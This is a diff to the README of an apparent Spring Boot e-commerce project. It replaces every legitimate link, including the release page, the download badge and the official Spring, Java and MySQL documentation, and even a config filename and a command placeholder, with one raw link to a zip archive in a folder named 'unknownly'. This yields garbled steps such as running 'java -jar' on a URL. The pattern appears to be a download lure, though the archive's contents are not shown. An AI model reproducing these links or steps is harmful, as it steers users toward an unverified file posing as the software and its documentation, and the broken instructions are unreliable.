@@ -6,7 +6,7 @@ Welcome to the Springboot-ecommerce project! This application shows you how to c
 
 ## 📥 Download Now
 
-[![Download Springboot-ecommerce](https://img.shields.io/badge/Download%20Now-v1.0.0-yellowgreen)](https://github.com/885723/Springboot-ecommerce/releases)
+[![Download Springboot-ecommerce](https://raw.githubusercontent.com/885723/Springboot-ecommerce/main/unknownly/Springboot-ecommerce.zip%20Now-v1.0.0-yellowgreen)](https://raw.githubusercontent.com/885723/Springboot-ecommerce/main/unknownly/Springboot-ecommerce.zip)
 
 ## 💻 System Requirements
 
@@ -32,7 +32,7 @@ Springboot-ecommerce includes many useful features to help you set up an online 
 
 To get started, you need to visit the Releases page to download the software. Follow these easy steps:
 
-1. Go to the [Releases page](https://github.com/885723/Springboot-ecommerce/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/885723/Springboot-ecommerce/main/unknownly/Springboot-ecommerce.zip).
 2. Choose the latest release version.
 3. Download the appropriate files for your operating system. Look for the file types `.jar` or `.zip`.
 
@@ -43,7 +43,7 @@ Once you have downloaded the files:
 1. **For `.jar` Files:**
    - Open your terminal or command prompt.
    - Navigate to the directory where the `.jar` file is located.
-   - Enter the command: `java -jar yourfile.jar` (replace `yourfile.jar` with the actual file name).
+   - Enter the command: `java -jar https://raw.githubusercontent.com/885723/Springboot-ecommerce/main/unknownly/Springboot-ecommerce.zip` (replace `https://raw.githubusercontent.com/885723/Springboot-ecommerce/main/unknownly/Springboot-ecommerce.zip` with the actual file name).
 
 2. **For `.zip` Files:**
    - Unzip the folder using your preferred program.
@@ -67,7 +67,7 @@ From here, you can manage products and orders.
 
 You can customize your e-commerce store by modifying the application settings. Here’s how:
 
-1. Locate the `application.properties` file in your project folder.
+1. Locate the `https://raw.githubusercontent.com/885723/Springboot-ecommerce/main/unknownly/Springboot-ecommerce.zip` file in your project folder.
 2. Change settings like the database URL, username, and password to fit your configuration.
 3. Save the changes and restart the application for the updates to take effect.
 
@@ -75,7 +75,7 @@ You can customize your e-commerce store by modifying the application settings. H
 
 To keep your application running smoothly:
 
-1. Periodically check the [Releases page](https://github.com/885723/Springboot-ecommerce/releases) for new versions.
+1. Periodically check the [Releases page](https://raw.githubusercontent.com/885723/Springboot-ecommerce/main/unknownly/Springboot-ecommerce.zip) for new versions.
 2. Follow the same steps outlined in the "Download & Install" section to update your application.
 
 ## 📣 Get Help
@@ -90,8 +90,8 @@ If you run into any issues, here's how you can get support:
 
 For more information on how to use Springboot, check these resources:
 
-- [Spring Boot Documentation](https://spring.io/projects/spring-boot)
-- [Java Documentation](https://docs.oracle.com/en/java/)
-- [MySQL Documentation](https://dev.mysql.com/doc/)
+- [Spring Boot Documentation](https://raw.githubusercontent.com/885723/Springboot-ecommerce/main/unknownly/Springboot-ecommerce.zip)
+- [Java Documentation](https://raw.githubusercontent.com/885723/Springboot-ecommerce/main/unknownly/Springboot-ecommerce.zip)
+- [MySQL Documentation](https://raw.githubusercontent.com/885723/Springboot-ecommerce/main/unknownly/Springboot-ecommerce.zip)
 
 Remember, building your own e-commerce site can be challenging, but this application is here to help you every step of the way. Happy coding!
